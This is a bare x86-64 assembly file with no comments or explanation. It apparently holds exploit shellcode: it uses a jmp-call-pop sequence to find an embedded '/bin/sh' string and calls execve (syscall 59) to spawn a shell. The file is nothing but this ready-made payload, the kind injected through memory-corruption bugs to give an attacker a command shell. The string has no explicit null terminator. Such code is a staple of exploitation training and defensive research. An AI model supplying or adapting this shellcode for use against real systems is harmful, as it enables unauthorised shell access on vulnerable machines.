[SECTION .text]
	global _start

_start:
	jmp short ender

	starter:
		push 59
		pop rax
		pop rbx
		mov rdi, rbx
		xor rsi, rsi
		xor rdx, rdx
		syscall
	ender:
		call starter
		db '/bin/sh'
